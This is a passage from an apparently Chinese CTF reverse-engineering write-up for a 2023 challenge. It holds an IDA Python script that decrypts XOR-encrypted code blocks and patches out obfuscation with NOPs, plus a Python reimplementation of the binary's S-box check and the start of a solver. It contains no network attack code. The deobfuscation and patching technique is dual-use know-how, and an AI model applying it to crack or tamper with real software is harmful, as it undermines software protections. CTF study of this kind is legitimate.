    &#123;&quot;base_addr&quot;: &quot;0x4016a5&quot;, &quot;len&quot;: &quot;0x15&quot;, &quot;key&quot;: &quot;0x19495cff&quot;&#125;,
    &#123;&quot;base_addr&quot;: &quot;0x4016fe&quot;, &quot;len&quot;: &quot;0x25&quot;, &quot;key&quot;: &quot;0x33a1c8b5&quot;&#125;,
    &#123;&quot;base_addr&quot;: &quot;0x40194a&quot;, &quot;len&quot;: &quot;0x20&quot;, &quot;key&quot;: &quot;0x19495cff&quot;&#125;,
    &#123;&quot;base_addr&quot;: &quot;0x40221b&quot;, &quot;len&quot;: &quot;0x22&quot;, &quot;key&quot;: &quot;0x19ccba0c&quot;&#125;,
    &#123;&quot;base_addr&quot;: &quot;0x40227d&quot;, &quot;len&quot;: &quot;0x14&quot;, &quot;key&quot;: &quot;0x7f23f981&quot;&#125;,
    &#123;&quot;base_addr&quot;: &quot;0x402b24&quot;, &quot;len&quot;: &quot;0x23&quot;, &quot;key&quot;: &quot;0x82c08da&quot;&#125;,
    &#123;&quot;base_addr&quot;: &quot;0x402bbf&quot;, &quot;len&quot;: &quot;0x84&quot;, &quot;key&quot;: &quot;0x2d5d3879&quot;&#125;,
    &#123;&quot;base_addr&quot;: &quot;0x402c81&quot;, &quot;len&quot;: &quot;0x22&quot;, &quot;key&quot;: &quot;0x4fe6e123&quot;&#125;,
    &#123;&quot;base_addr&quot;: &quot;0x40178b&quot;, &quot;len&quot;: &quot;0x21&quot;, &quot;key&quot;: &quot;0x19495cff&quot;&#125;,
    &#123;&quot;base_addr&quot;: &quot;0x40181e&quot;, &quot;len&quot;: &quot;0x21&quot;, &quot;key&quot;: &quot;0x3ac743d6&quot;&#125;,
    &#123;&quot;base_addr&quot;: &quot;0x401889&quot;, &quot;len&quot;: &quot;0x2b&quot;, &quot;key&quot;: &quot;0x7c2f3f1b&quot;&#125;,
    &#123;&quot;base_addr&quot;: &quot;0x402d11&quot;, &quot;len&quot;: &quot;0x21&quot;, &quot;key&quot;: &quot;0x2d5d3879&quot;&#125;,
    &#123;&quot;base_addr&quot;: &quot;0x402d9b&quot;, &quot;len&quot;: &quot;0x23&quot;, &quot;key&quot;: &quot;0x4fd1b124&quot;&#125;,
    &#123;&quot;base_addr&quot;: &quot;0x402e33&quot;, &quot;len&quot;: &quot;0x46&quot;, &quot;key&quot;: &quot;0x7ceb0021&quot;&#125;,
    &#123;&quot;base_addr&quot;: &quot;0x402edf&quot;, &quot;len&quot;: &quot;0x23&quot;, &quot;key&quot;: &quot;0xef6a336&quot;&#125;,
    &#123;&quot;base_addr&quot;: &quot;0x402f77&quot;, &quot;len&quot;: &quot;0x21&quot;, &quot;key&quot;: &quot;0x2ab50b6e&quot;&#125;,
    &#123;&quot;base_addr&quot;: &quot;0x402ffe&quot;, &quot;len&quot;: &quot;0x23&quot;, &quot;key&quot;: &quot;0x7a85187&quot;&#125;,
    &#123;&quot;base_addr&quot;: &quot;0x403096&quot;, &quot;len&quot;: &quot;0xc7&quot;, &quot;key&quot;: &quot;0x60cbd5d9&quot;&#125;,
    &#123;&quot;base_addr&quot;: &quot;0x403198&quot;, &quot;len&quot;: &quot;0x22&quot;, &quot;key&quot;: &quot;0x15697d0d&quot;&#125;,
    &#123;&quot;base_addr&quot;: &quot;0x403225&quot;, &quot;len&quot;: &quot;0x14&quot;, &quot;key&quot;: &quot;0x60cbd5d9&quot;&#125;,
    &#123;&quot;base_addr&quot;: &quot;0x403274&quot;, &quot;len&quot;: &quot;0x22&quot;, &quot;key&quot;: &quot;0x1948596b&quot;&#125;,
    &#123;&quot;base_addr&quot;: &quot;0x403301&quot;, &quot;len&quot;: &quot;0x14&quot;, &quot;key&quot;: &quot;0x2ab50b6e&quot;&#125;,
    &#123;&quot;base_addr&quot;: &quot;0x403350&quot;, &quot;len&quot;: &quot;0x22&quot;, &quot;key&quot;: &quot;0x21b6eba8&quot;&#125;,
    &#123;&quot;base_addr&quot;: &quot;0x4033dd&quot;, &quot;len&quot;: &quot;0x64&quot;, &quot;key&quot;: &quot;0x7ceb0021&quot;&#125;,
    &#123;&quot;base_addr&quot;: &quot;0x403526&quot;, &quot;len&quot;: &quot;0x21&quot;, &quot;key&quot;: &quot;0x280f9e95&quot;&#125;,
    &#123;&quot;base_addr&quot;: &quot;0x402806&quot;, &quot;len&quot;: &quot;0x36&quot;, &quot;key&quot;: &quot;0x3508284B&quot;&#125;,
    &#123;&quot;base_addr&quot;: &quot;0x40298E&quot;, &quot;len&quot;: &quot;0x21&quot;, &quot;key&quot;: &quot;0x7B62D32D&quot;&#125;,
    &#123;&quot;base_addr&quot;: &quot;0x40348B&quot;, &quot;len&quot;: &quot;0x60&quot;, &quot;key&quot;: &quot;0x280F9E95&quot;&#125;,
    &#123;&quot;base_addr&quot;: &quot;0x4018F4&quot;, &quot;len&quot;: &quot;0x1b&quot;, &quot;key&quot;: &quot;0x3AC743D6&quot;&#125;,
    &#123;&quot;base_addr&quot;: &quot;0x402889&quot;, &quot;len&quot;: &quot;0x36&quot;, &quot;key&quot;: &quot;0x7B62D32D&quot;&#125;,
]
def decrypt_block(base_addr, block_len, key):
    code = get_bytes(base_addr, block_len)
    real_code = bytearray(block_len)
    s = [(key &gt;&gt; (8 * i)) &amp; 0xff for i in range(4)]
    for i in range(block_len):
        real_code[i] = code[i] ^ ((i - 50) &amp; 0xff ^ s[i % 4])
    return bytes(real_code)

for block in arr:
    base_addr = int(block[&#39;base_addr&#39;], 16)
    block_len = int(block[&#39;len&#39;], 16)
    key = int(block[&#39;key&#39;], 16)
    code = decrypt_block(base_addr, block_len, key)
    patch_bytes(base_addr - 5, b&#39;\x90&#39; * 5)
    patch_bytes(base_addr, code)
    patch_bytes(base_addr + block_len, b&#39;\x90&#39; * 5)

for block in arr:
    base_addr = int(block[&#39;base_addr&#39;], 16)
    block_len = int(block[&#39;len&#39;], 16)
    addr = base_addr - 5
    regs = [str2reg(&#39;rdi&#39;), str2reg(&#39;rsi&#39;), str2reg(&#39;rdx&#39;)]
    i = 0
    while i &lt; 10:
        i += 1
        addr = prev_head(addr, 0x400000)
        ins = insn_t()
        decode_insn(ins, addr)
        if &#39;mov&#39; not in ins.get_canon_mnem():
            continue
        op0 = ins.ops[0]
        op1 = ins.ops[1]
        if op0.type == idaapi.o_reg:
            if op0.reg in regs:
                regs.remove(op0.reg)
                if op1.type == idaapi.o_reg:
                    regs.append(op1.reg)
                patch_bytes(addr, b&#39;\x90&#39; * get_item_size(addr))
        elif op0.type == idaapi.o_displ and op1.type == idaapi.o_imm:
            patch_bytes(addr, b&#39;\x90&#39; * get_item_size(addr))
        elif op1.type == idaapi.o_reg and (op1.reg == str2reg(&#39;rax&#39;) or op1.reg == str2reg(&#39;rcx&#39;)):
            patch_bytes(addr, b&#39;\x90&#39; * get_item_size(addr))


    regs = [str2reg(&#39;rdi&#39;), str2reg(&#39;rsi&#39;), str2reg(&#39;rdx&#39;)]
    addr = base_addr + block_len
    i = 0
    while i &lt; 6:
        addr = prev_head(addr, 0x400000)
        ins = insn_t()
        decode_insn(ins, addr)
        if &#39;mov&#39; not in ins.get_canon_mnem():
            continue
        op0 = ins.ops[0]
        op1 = ins.ops[1]
        if op0.type == idaapi.o_reg:
            if op0.reg in regs:
                regs.remove(op0.reg)
                if op1.type == idaapi.o_reg:
                    regs.append(op1.reg)
                patch_bytes(addr, b&#39;\x90&#39; * get_item_size(addr))
        i += 1

refs = idautils.CodeRefsTo(0x4035C0, 0)
for ref in refs:
    i = 0
    regs = [str2reg(&#39;rdi&#39;), str2reg(&#39;rsi&#39;), str2reg(&#39;rdx&#39;), str2reg(&#39;rcx&#39;), str2reg(&#39;r8&#39;)]
    addr = ref
    patch_bytes(addr, b&#39;\x90&#39; * get_item_size(addr))
    while i &lt; 6:
        addr = prev_head(addr, 0x400000)
        ins = insn_t()
        decode_insn(ins, addr)
        if &#39;mov&#39; not in ins.get_canon_mnem() and &#39;lea&#39; not in ins.get_canon_mnem():
            continue
        op0 = ins.ops[0]
        op1 = ins.ops[1]
        if op0.type == idaapi.o_reg:
            if op0.reg in regs:
                regs.remove(op0.reg)
                if op1.type == idaapi.o_reg:
                    regs.append(op1.reg)
                patch_bytes(addr, b&#39;\x90&#39; * get_item_size(addr))
        i += 1
</code></pre>
<p>检查uuid格式</p>
<p><img src="/2023/09/03/%E7%BE%8A%E5%9F%8E%E6%9D%AF2023/image-20231012095340707.png" alt="image-20231012095340707"></p>
<p>通过盒做一个转化映射：</p>
<p><img src="/2023/09/03/%E7%BE%8A%E5%9F%8E%E6%9D%AF2023/image-20231012095440758.png" alt="image-20231012095440758"></p>
<p>然后做了一个递推循环（可逆）</p>
<p><img src="/2023/09/03/%E7%BE%8A%E5%9F%8E%E6%9D%AF2023/image-20231012100145373.png" alt="image-20231012100145373"></p>
<p>流程用python写一下这样：</p>
<p>(秘钥流需要自己动调获取)</p>
<pre><code class="python">input =  &#39;11111111111111111111111111111111&#39;
enc1 = &#39;ac2018c9c49436ec3154691ea51de52ca91251c38c13722d11a325a18198411e91ca9e4c&#39;
s_box = [ 0x63, 0x7C, 0x77, 0x7B, 0xF2, 0x6B, 0x6F, 0xC5, 0x30, 0x01,  0x67, 0x2B, 0xFE, 0xD7, 0xAB, 0x76, 0xCA, 0x82, 0xC9, 0x7D,  0xFA, 0x59, 0x47, 0xF0, 0xAD, 0xD4, 0xA2, 0xAF, 0x9C, 0xA4,  0x72, 0xC0, 0xB7, 0xFD, 0x93, 0x26, 0x36, 0x3F, 0xF7, 0xCC,  0x34, 0xA5, 0xE5, 0xF1, 0x71, 0xD8, 0x31, 0x15, 0x04, 0xC7,  0x23, 0xC3, 0x18, 0x96, 0x05, 0x9A, 0x07, 0x12, 0x80, 0xE2,  0xEB, 0x27, 0xB2, 0x75, 0x09, 0x83, 0x2C, 0x1A, 0x1B, 0x6E,  0x5A, 0xA0, 0x52, 0x3B, 0xD6, 0xB3, 0x29, 0xE3, 0x2F, 0x84,  0x53, 0xD1, 0x00, 0xED, 0x20, 0xFC, 0xB1, 0x5B, 0x6A, 0xCB,  0xBE, 0x39, 0x4A, 0x4C, 0x58, 0xCF, 0xD0, 0xEF, 0xAA, 0xFB,  0x43, 0x4D, 0x33, 0x85, 0x45, 0xF9, 0x02, 0x7F, 0x50, 0x3C,  0x9F, 0xA8, 0x51, 0xA3, 0x40, 0x8F, 0x92, 0x9D, 0x38, 0xF5,  0xBC, 0xB6, 0xDA, 0x21, 0x10, 0xFF, 0xF3, 0xD2, 0xCD, 0x0C,  0x13, 0xEC, 0x5F, 0x97, 0x44, 0x17, 0xC4, 0xA7, 0x7E, 0x3D,  0x64, 0x5D, 0x19, 0x73, 0x60, 0x81, 0x4F, 0xDC, 0x22, 0x2A,  0x90, 0x88, 0x46, 0xEE, 0xB8, 0x14, 0xDE, 0x5E, 0x0B, 0xDB,  0xE0, 0x32, 0x3A, 0x0A, 0x49, 0x06, 0x24, 0x5C, 0xC2, 0xD3,  0xAC, 0x62, 0x91, 0x95, 0xE4, 0x79, 0xE7, 0xC8, 0x37, 0x6D,  0x8D, 0xD5, 0x4E, 0xA9, 0x6C, 0x56, 0xF4, 0xEA, 0x65, 0x7A,  0xAE, 0x08, 0xBA, 0x78, 0x25, 0x2E, 0x1C, 0xA6, 0xB4, 0xC6,  0xE8, 0xDD, 0x74, 0x1F, 0x4B, 0xBD, 0x8B, 0x8A, 0x70, 0x3E,  0xB5, 0x66, 0x48, 0x03, 0xF6, 0x0E, 0x61, 0x35, 0x57, 0xB9,  0x86, 0xC1, 0x1D, 0x9E, 0xE1, 0xF8, 0x98, 0x11, 0x69, 0xD9,  0x8E, 0x94, 0x9B, 0x1E, 0x87, 0xE9, 0xCE, 0x55, 0x28, 0xDF,  0x8C, 0xA1, 0x89, 0x0D, 0xBF, 0xE6, 0x42, 0x68, 0x41, 0x99,  0x2D, 0x0F, 0xB0, 0x54, 0xBB, 0x16]
input1 = []
keylist2 = [212,253,128,196,80,16,222,109,232,240,12,82,9,64,36,151,222,119,20,95,105,246,192,116,142,109,128,206,204,7,192,244,160,4,240,28,198,0,162,88,244,52,64,176,76,160,168,86,89,233,56,40,208,104,64,102,150,69,210,103,64,208,36,0,19,76,202,120,76,188,192,66,0,16,109,192,0,56,176,4,196,72,128,232,113,255,64,132,70,84,37,122,56,32,248,192,56,148,249,112,228,250,112,8,64,51,231,104,176,214,32,251,129,76,46,138,27,58,146,120,232,36,34,39,92,210,20,138,176,96,100,32,16,229,209,92,233,121,82,52,103,128,76,226,32,160,84,223,40,48,240,134,173,197,133,113,192,78,186,204,152,35,86,18,144,201,91,84,84,72,186,172,44,220,34,144,232,24,140,129,68,49,132,128,232,138,224,140,186,250,188,230,240,158,102,218,84,161,200,30,144,240,147,57,80,24,153,149,72,129,160,74,176,106,128,123,176,200,157,57,251,126,116,64,128,42,144,96,74,226,218,0,14,192,224,190,6,197,97,212,156,51,136,64,112,120,242,124,172,176,248,203,204,62,234,100,160,190,172,10,212,48,88,77,116,72,144,24,234,16,192,0,5,160,78,221,236,168,16,224,32,66,9,100,64,148,147,144,97,2,58,57,223,154,60,41,111,231,16,179,75,211,157,178,91,7,132,240,59,190,206,182,188,10,72,184,99,72,250,104,116,228,248,172,22,151,142,42,233,76,44,235,104,130,184,36,146,6,185,162,240,144,234,170,228,10,123,64,92,252,190,84,144,129,68,244,55,160,147,101,32,22,130,205,174,36,0,41,160,139,68,251,228,88,213,192,156,132,13,141,207,80,40,8,140,190,108,188,24,8,9,89,173,204,248,28,120,40,189,90,49,222,0,108,97,139,35,176,133,141,20,63,152,104,3,172,192,115,150,32,58,194,108,64,49,112,152,46,144,22,186,254,195,129,152,119,196,187,115,248,58,17,112,17,124,29,152,132,12,31,90,77,179,192,49,176,33,76,156,32,230,108,137,192,121,191,53,168,102,137,200,34,118,192,138,193,112,216,45,217,182,128,56,140,128,208,46,35,64,171,123,199,221,52,75,244,192,63,178,205,97,145,48,216,188,228,203,72,165,204,130,178,24,243,30,150,113,89,30,156,104,59,232,65,168,8,117,208,132,248,214,12,221,64,107,51,164,124,32,150,79,47,184,18,200,22,64,232,160,45,112,16,189,96,76,220,57,171,89,97,113,208,192,235,240,254,170,212,92,252,147,248,249,68,97,64,24,230,134,126,3,80,23,184,171,16,130,66,9,68,224,150,202,212,10,70,156,107,210,146,205,144,64,46,107,16,83,96,167,151,99,218,130,41,198,0,112,172,188,74,64,4,224,116,176,176,128,48,220,112,108,64,126,208,144,157,45,135,184,197,100,13,220,94,96,215,12,219,0,128,33,23,221,184,32,253,143,0,184,24,28,4,255,177,104,196,233,171,132,107,130,128,20,68,200,106,33,250,52,166,249,91,216,94,240,211,239,146,246,243,198,126,227,136,45,229,246,191,144,190,228,48,168,59,140,200,236,54,236,0,176,4,248,184,79,64,194,248,124,209,123,48,180,136,107,160,0,112,89,20,133,215,140,68,41,163,233,192,47,166,228,230,251,185,188,180,54,212,156,208,40,100,4,132,16,53,96,200,26,192,237,19,95,154,240,234,96,219,128,75,239,206,159,112,255,0,35,157,138,164,176,208,98,104,47,128,117,116,13,222,0,96,49,64,195,144,148,134,49,255,34,120,52,32,137,55,49,131,46,177,113,64,9,192,196,78,226,82,94,144,160,38,87,71,78,144,84,188,82,67,202,209,144,32,36,25,140,94,148,168,12,168,196,221,145,71,128,96,56,64,184,101,112,32,145,72,71,0,108,112,166,254,36,68,0,132,188,214,125,60,200,113,46,28,149,147,48,169,138,239,101,184,73,192,32,51,104,112,104,16,176,110,234,8,219,98,192,139,102,62,80,96,121,24,212,105,150,28,63,26,80,108,87,0,4,216,124,97,127,164,4,7,116,80,119,41,160,140,224,92,4,248,224,195,222,44,210,158,241,64,92,80,220,45,0,193,208,208,7,20,108,253,158,110,201,94,48,168,58,33,168,149,88,135,64,117,108,12,104,216,158,230,194,112,121,0,103,41,252,1,242,22,236,250,96,175,96,29,236,184,252,157,72,96,232,172,30,136,151,32,61,128,80,16,198,152,96,235,144,70,18,0,32,96,8,84,236,123,0,2,176,7,240,156,88,200,216,12,9,184,57,104,160,16,182,99,0,56,200,128,223,230,58,220,88,88,148,92,99,96,140,147,193,208,224,68,86,96,200,187,122,126,115,27,171,184,11,140,35,28,240,24,123,15,147,250,102,224,76,0,232,180,49,48,240,130,24,64,254,140,240,252,31,113,140,126,200,128,206,0,0,160,213,35,39,4,0,237,217,144,130,108,125,4,0,192,18,211,24,93,134,224,83,65,159,216,221,11,224,230,239,130,100,119,83,123,91,220,20,132,86,128,32,168,57,80,232,96,88,70,240,242,6,192,230,4,208,190,121,205,168,62,160,30,137,36,56,251,58,88,126,38,164,0,56,152,131,232,100,120,176,213,249,246,22,99,136,161,160,96,245,36,246,224,48,228,164,38,16,191,157,220,244,208,56,205,10,38,41,12,208,120,227,176,154,115,128,67,167,163,156,197,124,41,74,112,40,172,135,241,80,212,17,232,50,184,180,76,21,180,124,81,41,172,144,158,18,216,190,191,16,4,132,230,136,220,219,224,0,73,96,196,16,114,146,238,140,22,117,110,126,64,8,148,65,64,96,136,11,0,90,44,46,10,10,78,48,42,136,78,17,35,190,112,128,237,80,185,187,56,80,28,108,35,32,202,162,230,112,248,147,69,128,101,95,123,204,160,220,48,238,86,134,175,16,253,121,221,236,145,24,176,44,168,192,56,241,31,128,21,98,41,96,234,144,151,134,97,226,124,67,213,14,168,0,228,140,16,198,16,52,68,216,242,24,192,217,92,172,182,229,13,15,221,148,136,167,88,254,226,213,176,104,138,20,152,10,70,22,230,96,63,200,72,164,58,61,210,24,214,63,255,36,77,138,0,172,96,246,182,232,0,248,204,248,0,116,14,252,192,248,139,200,85,93,28,32,75,248,16,128,176,0,78,156,137,152,218,48,18,76,205,218,171,63,80,40,224,0,6,240,87,128,15,233,52,68,49,248,134,193,47,0,128,30,194,96,167,182,224,112,202,161,206,79,187,176,198,212,44,198,139,0,176,16,186,141,139,24,12,253,89,195,160,175,23,130,97,254,128,96,235,192,70,144,66,64,238,72,188,64,216,88,96,80,151,68,210,224,161,77,22,80,132,240,84,21,9,173,12,128,128,68,112,224,81,202,52,134,136,18,20,199,32,244,243,107,108,16,220,84,72,236,125,148,184,64,185,49,88,156,240,221,168,80,87,24,208,108,254,32,107,185,23,130,78,217,104,0,147,60,82,160,226,187,64,36,232,196,85,182,39,202,63,118,88,192,169,0,70,8,32,166,144,139,86,52,17,157,29,160,224,24,126,147,148,189,156,250,11,189,110,68,43,179,148,253,167,168,240,100,190,140,250,221,92,14,143,128,92,168,18,119,112,153,220,74,118,8,46,84,96,186,224,173,199,153,154,0,8,0,184,98,148,65,128,154,196,38,237,191,144,245,116,91,45,73,87,192,68,208,159,242,94,96,179,64,134,104,106,32,48,22,208,188,96,7,144,136,49,185,125,139,16,249,112,66,41,98,232,55,80,197,144,40,167,132,70,52,104,64,107,228,64,25,32,144,38,148,174,196,225,50,126,175,253,96,16,100,196,152,8,192,233,219,52,11,112,150,100,4,226,50,186,153,48,232,170,30,142,189,211,142,48,55,125,52,73,248,0,59,94,211,124,200,133,179,243,64,112,128,64,211,197,144,168,162,183,128,0,204,185,40,198,133,190,12,152,250,180,121,118,239,176,128,203,129,0,72,127,240,200,144,78,124,240,107,84,89,214,75,228,121,81,32,0,192,246,169,212,212,224,254,239,28,178,212,114,128,194,234,246,223,240,118,239,120,212,152,215,114,77,235,64,71,24,168,113,82,87,160,119,197,134,0,176,10,45,168,144,219,232,235,247,8,68,146,100,97,250,102,34,220,248,0,93,26,214,181,24,0,248,127,216,104,7,156,220,160,249,14,136,37,176,144,96,241,41,136,207,132,62,32,152,40,58,80,135,51,45,176,132,132,208,164,64,0,120,170,250,32,218,197,45,15,56,32,56,3,220,67,98,113,11,175,32,107,0,228,88,235,198,184,160,160,112,16,118,70,160,180,216,226,120,71,14,79,200,212,48,228,132,76,176,145,194,160,254,112,239,16,64,104,131,210,180,32,205,208,0,254,179,51,55,128,151,215,160,199,98,190,64,255,208,192,68,148,218,50,176,156,216,90,52,114,14,21,12,128,208,194,26,207,250,178,32,72,200,94,93,98,187,38,164,107,115,0,8,242,143,187,19,182,64,11,241,233,241,249,128,248,76,202,61,96,231,154,62,13,119,131,150,96,160,196,129,196,246,32,121,48,64,66,149,228,11,74,48,64,170,115,145,188,167,232,237,32,78,188,109,188,245,34,174,107,121,56,129,92,136,89,188,80,84,107,132,97,184,32,193,236,8,195,156,58,50,7,208,251,209,211,171,191,28,192,147,154,226,144,40,160,224,232,240,209,160,204,224,168,90,160,97,26,174,46,177,25,38,94,0,244,94,156,221,179,208,142,128,94,111,34,40,96,62,232,155,151,20,14,202,80,12,0,15,64,36,255,240,235,14,250,124,116,27,108,33,183,215,176,27,48,130,187,250,92,3,176,200,160,85,225,224,177,131,52,192,186,80,219,68,141,214,177,138,190,231,119,2,136,152,221,0,225,11,16,24,79,1,194,16,112,128,179,42,198,64,79,249,114,14,33,224,122,44,212,188,60,240,242,202,0,114,20,240,186,127,112,152,128,141,167,65,84,63,77,191,198,0,192,16,48,117,214,0,192,50,40,228,63,165,148,88,200,212,182,4,133,56,138,73,28,38,161,236,200,134,25,0,88,112,209,194,36,109,55,46,192,128,28,32,213,17,17,68,152,153,64,128,21,26,222,152,0,0,124,107,0,237,68,195,202,216,232,128,22,196,176,217,184,228,93,239,211,76,96,203,221,80,145,178,64,23,108,220,32,7,220,110,255,248,157,96,47,192,148,60,154,192,144,26,109,112,136,128,174,0,200,1,192,211,165,200,164,182,152,224,128,76,38,240,96,81,60,85,120,54,90,158,241,88,213,9,210,166,183,124,121,138,80,19,149,179,158,50,56,221,189,228,220,143,160,46,64,200,52,154,255,224,73,144,114,217,164,200,170,124,65,32,64,0,76,15,192,238,124,97,188,208,0,148,66,120,197,152,185,31,104,155,145,215,4,8,190,102,0,232,252,112,64,156,62,192,10,60,53,88,183,255,45,96,154,136,190,111,212,16,155,160,122,238,166,86,106,7,85,0,135,212,197,60,239,208,252,214,48,0,246,0,109,114,24,135,216,170,152,150,149,72,177,121,240,158,32,215,64,112,80,228,84,124,204,206,16,22,162,253,54,134,80,154,224,156,164,90,98,206,177,119,234,69,64,83,170,134,240,11,4,178,59,80,16,248,98,208,182,172,112,128,102,216,16,40,56,137,5,249,105,152,91,224,104,242,245,167,171,144,168,203,64,168,184,208,141,40,83,156,82,204,254,192,71,48,255,28,88,230,105,135,192,152,140,192,144,140,249,238,190,16,208,152,32,166,142,232,214,16,50,112,126,66,185,20,108,229,14,200,108,0,1,202,70,116,152,18,199,216,96,156,212,198,248,252,2,96,192,196,16,26,186,172,35,64,223,130,71,125,134,6,208,242,8,3,158,152,112,208,154,14,53,88,177,98,208,63,225,131,11,80,108,60,209,227,72,20,224,130,233,144,62,32,75,122,178,19,36,153,60,92,19,176,73,188,7,185,80,170,244,32,121,136,23,35,85,40,227,179,80,11,243,77,64,192,216,177,22,144,84,83,96,73,248,96,11,169,222,228,0,184,112,148,175,153,4,56,216,30,0,196,156,64,4,75,217,248,112,200,132,52,151,247,234,206,60,192,83,124,250,120,15,147,218,16,72,79,248,44,142,90,224,64,85,76,159,184,143,87,128,97,229,3,135,16,130,194,194,69,198,233,96,0,219,24,168,184,246,234,238,224,52,48,126,20,158,146,156,179,138,240,100,145,144,82,40,184,79,0,76,116,0,160,170,190,48,120,93,76,48,236,210,122,152,204,253,241,56,166,242,120,252,64,128,32,64,212,200,251,208,108,156,120,82,4,11,247,136,17,98,246,40,242,64,144,84,142,175,46,212,185,42,31,176,219,205,52,144,216,69,128,92,240,25,169,194,208,115,185,14,6,15,52,75,212,40,224,10,220,99,42,183,196,240,64,98,23,109,20,203,111,232,77,64,251,2,194,243,112,64,199,105,168,157,213,51,168,28,223,100,152,184,157,224,132,232,14,33,115,135,2,163,6,16,143,84,72,101,32,56,84,182,47,112,160,244,139,39,32,40,7,228,105,62,176,149,112,120,218,34,80,98,7,138,144,1,79,30,120,253,68,28,32,27,100,222,219,3,216,205,52,207,66,240,255,188,162,44,152,125,181,112,110,184,164,36,234,80,128,16,8,95,144,53,178,196,84,56,172,166,104,236,64,228,45,146,182,8,169,224,6,228,176,72,127,208,173,246,188,20,186,89,45,0,232,63,216,47,32,192,100,41,214,101,208,136,6,60,33,164,67,208,240,230,220,0,188,135,120,215,83,212,14,240,56,248,64,252,49,1,98,198,116,119,128,0,72,46,210,13,28,37,220,19,67,0,159,153,61,171,55,124,219,127,42,237,220,250,77,144,238,216,25,222,183,76,137,67,40,176,159,120,78,72,58,152,32,128,208,162,248,64,91,152,192,136,69,188,96,17,248,72,191,228,178,85,207,157,11,244,18,202,0,220,224,252,116,221,142,178,158,64,252,128,126,103,80,46,78,206,29,33,138,152,155,36,32,224,162,100,36,163,162]
keylist = [  0x03, 0x02, 0x03, 0x01, 0x03, 0x02, 0x03, 0x03, 0x03, 0x02,  0x02, 0x02, 0x02, 0x02, 0x03, 0x03, 0x02, 0x01, 0x03, 0x01,  0x03, 0x02, 0x01, 0x02, 0x03, 0x02, 0x02, 0x01, 0x01, 0x02,  0x02, 0x02]

h = &#39;1234567890abcdef&#39;
def ord_(a):
    if(ord(a) &gt;= ord(&#39;0&#39;) and ord(a) &lt;= ord(&#39;9&#39;)):
        return int(a)
    else:
        return ord(a) - ord(&#39;a&#39;) + 10

key = 0
for i in range(32):
    key += keylist[i]
    input1.append(enc1[key])
    # print(enc1[key],end=&#39; &#39;)
    input1.append(h[((ord(enc1[key]) &amp; 0xff) + 3 * ord_(input[i])) % 16])
print()
enc2 = &#39;&#39;.join(input1)
enc2 = [int(enc2[i:i+2], 16) for i in range(0, len(enc2), 2)]

count_key = 0
for i in range(4):
    v66_in = 8 * i
    for j in range(100):
        for k in range(7, -1, -1):
            v63 = ((keylist2[count_key] &amp; 0xff) + enc2[v66_in + k])
            count_key += 1
            v15 = s_box[v63 &amp; 0xff]
            v62 = enc2[v66_in + (k + 1) % 8]
            v62 = (v62 &lt;&lt; 7) | (v62 &gt;&gt; 1 &amp; 0xff)
            enc2[v66_in + ((k + 1) % 8)] = (v62 - v15) &amp; 0xff
# for i in enc2:
#     print(hex(i),end=&#39;,&#39;)
</code></pre>
<p>可以得到exp：</p>
<pre><code class="python">enc = [  0x2A, 0x59, 0xD8, 0xEE, 0xAB, 0x56, 0x68, 0x37, 0xAB, 0x40,
  0xCA, 0x7E, 0x7F, 0x53, 0xCF, 0x3C, 0x19, 0x7A, 0x0A, 0x24,
  0xF6, 0x25, 0xCC, 0x92, 0x78, 0xFF, 0xCC, 0x2D, 0x59, 0x10,
  0xA2, 0x2D]
# print(len(enc))
s_box = [ 0x63, 0x7C, 0x77, 0x7B, 0xF2, 0x6B, 0x6F, 0xC5, 0x30, 0x01,
  0x67, 0x2B, 0xFE, 0xD7, 0xAB, 0x76, 0xCA, 0x82, 0xC9, 0x7D,
  0xFA, 0x59, 0x47, 0xF0, 0xAD, 0xD4, 0xA2, 0xAF, 0x9C, 0xA4,
  0x72, 0xC0, 0xB7, 0xFD, 0x93, 0x26, 0x36, 0x3F, 0xF7, 0xCC,
  0x34, 0xA5, 0xE5, 0xF1, 0x71, 0xD8, 0x31, 0x15, 0x04, 0xC7,
  0x23, 0xC3, 0x18, 0x96, 0x05, 0x9A, 0x07, 0x12, 0x80, 0xE2,
  0xEB, 0x27, 0xB2, 0x75, 0x09, 0x83, 0x2C, 0x1A, 0x1B, 0x6E,
  0x5A, 0xA0, 0x52, 0x3B, 0xD6, 0xB3, 0x29, 0xE3, 0x2F, 0x84,
  0x53, 0xD1, 0x00, 0xED, 0x20, 0xFC, 0xB1, 0x5B, 0x6A, 0xCB,
  0xBE, 0x39, 0x4A, 0x4C, 0x58, 0xCF, 0xD0, 0xEF, 0xAA, 0xFB,
  0x43, 0x4D, 0x33, 0x85, 0x45, 0xF9, 0x02, 0x7F, 0x50, 0x3C,
  0x9F, 0xA8, 0x51, 0xA3, 0x40, 0x8F, 0x92, 0x9D, 0x38, 0xF5,
  0xBC, 0xB6, 0xDA, 0x21, 0x10, 0xFF, 0xF3, 0xD2, 0xCD, 0x0C,
  0x13, 0xEC, 0x5F, 0x97, 0x44, 0x17, 0xC4, 0xA7, 0x7E, 0x3D,
  0x64, 0x5D, 0x19, 0x73, 0x60, 0x81, 0x4F, 0xDC, 0x22, 0x2A,
  0x90, 0x88, 0x46, 0xEE, 0xB8, 0x14, 0xDE, 0x5E, 0x0B, 0xDB,
  0xE0, 0x32, 0x3A, 0x0A, 0x49, 0x06, 0x24, 0x5C, 0xC2, 0xD3,
  0xAC, 0x62, 0x91, 0x95, 0xE4, 0x79, 0xE7, 0xC8, 0x37, 0x6D,
  0x8D, 0xD5, 0x4E, 0xA9, 0x6C, 0x56, 0xF4, 0xEA, 0x65, 0x7A,
  0xAE, 0x08, 0xBA, 0x78, 0x25, 0x2E, 0x1C, 0xA6, 0xB4, 0xC6,
  0xE8, 0xDD, 0x74, 0x1F, 0x4B, 0xBD, 0x8B, 0x8A, 0x70, 0x3E,
  0xB5, 0x66, 0x48, 0x03, 0xF6, 0x0E, 0x61, 0x35, 0x57, 0xB9,
  0x86, 0xC1, 0x1D, 0x9E, 0xE1, 0xF8, 0x98, 0x11, 0x69, 0xD9,
  0x8E, 0x94, 0x9B, 0x1E, 0x87, 0xE9, 0xCE, 0x55, 0x28, 0xDF,
  0x8C, 0xA1, 0x89, 0x0D, 0xBF, 0xE6, 0x42, 0x68, 0x41, 0x99,
  0x2D, 0x0F, 0xB0, 0x54, 0xBB, 0x16]
